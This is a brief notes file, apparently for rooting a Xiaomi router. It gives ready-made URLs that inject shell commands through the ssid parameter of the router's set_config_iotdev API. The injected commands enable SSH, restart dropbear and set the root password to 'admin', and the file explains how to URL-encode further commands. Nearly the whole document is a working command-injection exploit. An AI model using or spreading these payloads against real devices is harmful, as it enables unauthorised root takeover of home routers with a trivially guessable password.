# enable ssh
# nvram set ssh_en=1; nvram commit; sed -i 's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear; /etc/init.d/dropbear start; echo -e 'admin\nadmin' | passwd root;
http://192.168.31.36/cgi-bin/luci/;stok=<secret-key>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B

# based url 
http://192.168.31.36/cgi-bin/luci/;stok=<secret-key>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20

# set passwd command
http://192.168.31.36/cgi-bin/luci/;stok=<secret-key>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20
# encode command in url : https://meyerweb.com/eric/tools/dencoder/
echo -e 'admin\nadmin' | passwd root
# encoded
echo%20-e%20%27admin%5Cnadmin%27%20%7C%20passwd%20root
# final url
http://192.168.31.36/cgi-bin/luci/;stok=<secret-key>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20%27admin%5Cnadmin%27%20%7C%20passwd%20root
